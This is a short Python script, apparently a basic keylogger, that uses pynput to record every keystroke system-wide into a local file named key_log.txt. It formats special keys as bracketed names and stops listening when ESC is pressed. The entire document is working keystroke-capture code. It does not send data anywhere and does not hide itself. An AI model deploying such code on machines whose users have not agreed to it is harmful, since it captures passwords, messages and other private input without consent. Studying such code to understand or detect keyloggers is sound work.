import pynput
from pynput.keyboard import Key, Listener

# Path to the file where logs will be saved
log_file = "key_log.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as file:
        key_str = str(key).replace("'", "")
        if key_str == 'Key.space':
            file.write(' ')
        elif key_str == 'Key.enter':
            file.write('\n')
        elif key_str == 'Key.tab':
            file.write('\t')
        elif 'Key' in key_str:
            file.write(f'[{key_str}]')
        else:
            file.write(key_str)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        # Stop listener on ESC key press
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

